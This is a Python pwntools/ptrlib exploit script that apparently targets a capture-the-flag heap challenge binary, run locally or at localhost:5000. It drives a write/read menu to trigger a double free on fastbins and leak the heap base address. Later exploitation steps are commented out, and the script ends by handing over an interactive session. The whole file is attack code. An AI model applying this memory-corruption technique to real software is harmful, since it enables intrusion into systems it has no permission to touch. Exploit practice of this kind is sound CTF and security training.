#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./prob_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def write(idx: int, size: int, data: bytes):
        assert len(data) == size
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"idx: ", str(idx).encode())
        io.sendlineafter(b"size: ", str(size).encode())
        io.send(data)
        return

    def read(idx: int):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"idx: ", str(idx).encode())
        io.recvuntil(b"midx = ")
        midx = io.recvuntil(b"msg->", drop=True)
        io.recvuntil(b"size = ")
        size = io.recvuntil(b"msg->", drop=True)
        io.recvuntil(b"buf = ")
        buf = io.recvuntil(b"\n1. write", drop=True)
        return [midx, size, buf]

    # heap leak with double free on fastbins
    for i in range(0x7):
        write(i, 0x20, b"A" * 0x20)
        continue

    write(8, 0x20, b"B" * 0x20)
    write(9, 0x20, b"B" * 0x20)
    write(10, 0x20, b"B" * 0x20)

    write(7, 0x20, b"C" * 0x20)  # preventation for consolidation

    for i in range(0x7 - 1, -1, -1):
        read(i)
        continue

    read(8)
    read(9)
    heap_base = int(read(8)[0].strip(b"\n")) << 12
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    #
    # for _ in range(5):
    #     write(0, 0x20, b"A" * 0x20)
    #     continue

    input(">> ")
    # write(0, 0x1000, b"B" * 0x1000)
    #
    # write(0, 0x20, b"B" * 0x20)
    # write()

    io.interactive()
    return


if __name__ == "__main__":
    main()
